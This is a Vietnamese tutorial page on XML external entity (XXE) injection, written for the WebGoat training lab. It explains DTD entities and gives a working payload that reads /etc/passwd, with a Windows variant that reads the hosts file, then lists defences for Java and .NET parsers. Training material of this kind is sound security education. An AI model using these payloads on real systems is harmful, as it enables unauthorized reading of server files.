---
title: 1.03 | XXE
slug: XXE-03
description: Bài viết này sẽ hướng dẫn cách tấn công XXE trên WebGoat 2023.8
image: https://tiennhm.github.io/img/docs/database.jpg
sidebar_position: 1
# sidebar_class_name: hidden
tags: 
    - web-security
    - webgoat
    - security-misconfiguration
    - xxe
    - webgoat-2023.8
keywords: [web-security, webgoat, security-misconfiguration, xxe, webgoat-2023.8]
enableComments: true # for Gisqus comments, set to true
draft: false # set to true to hide this post from the site
---

> 🚨 **XXE Injection Example**  

## 📌 **1. Ví dụ về XML Entity**  
Như đã biết, một **Entity** có thể được khai báo trong DTD như sau:  
```xml
<?xml version="1.0" standalone="yes" ?>
<!DOCTYPE author [
  <!ELEMENT author (#PCDATA)>
  <!ENTITY js "Jo Smith">
]>
<author>&js;</author>
```
✅ Khi XML parser xử lý, `&js;` sẽ được thay thế bằng `"Jo Smith"`.


## 🔥 **2. External DTD Declaration (Tập tin DTD bên ngoài)**  
Chúng ta có thể khai báo một **DTD bên ngoài** bằng cách sử dụng `SYSTEM` reference, ví dụ:  

📌 **Tập tin XML chính (`email.xml`)**
```xml
<?xml version="1.0"?>
<!DOCTYPE email SYSTEM "email.dtd">
<email>
  <to>webgoat@webgoat.org</to>
  <from>webwolf@webwolf.org</from>
  <subject>Your app is great, but contains flaws</subject>
  <body>Hi, your application contains some SQL injections</body>
</email>
```

📌 **Tập tin `email.dtd`**  
```xml
<!ELEMENT email (to,from,subject,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT subject (#PCDATA)>
<!ELEMENT body (#PCDATA)>
```
✅ Khi `email.xml` được xử lý, nó sẽ tham chiếu đến `email.dtd` để xác định cấu trúc hợp lệ.


## 🚨 **3. XXE Injection – Đọc file hệ thống**  
Nếu parser **cho phép external entities**, hacker có thể khai thác để đọc file hệ thống.  

📌 **Payload XXE để đọc `/etc/passwd`**
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE author [
  <!ENTITY js SYSTEM "file:///etc/passwd">
]>
<author>&js;</author>
```
✅ Khi parser xử lý, nó sẽ thay `&js;` bằng nội dung của `/etc/passwd`, làm rò rỉ thông tin hệ thống.

📌 **Phản hồi của server có thể là:**  
```xml
<author>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
</author>
```
📌 **Trên Windows, hacker có thể thay đổi payload thành:**
```xml
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
```


## 🛡 **4. Cách phòng chống XXE**  
✅ **Vô hiệu hóa DTD và External Entities**  
- Trong Java:  
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```
- Trong .NET:  
```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
```
✅ **Dùng JSON thay thế XML**  
✅ **Giới hạn quyền truy cập file hệ thống**  
✅ **Dùng WAF để chặn payload chứa `<!ENTITY`**  
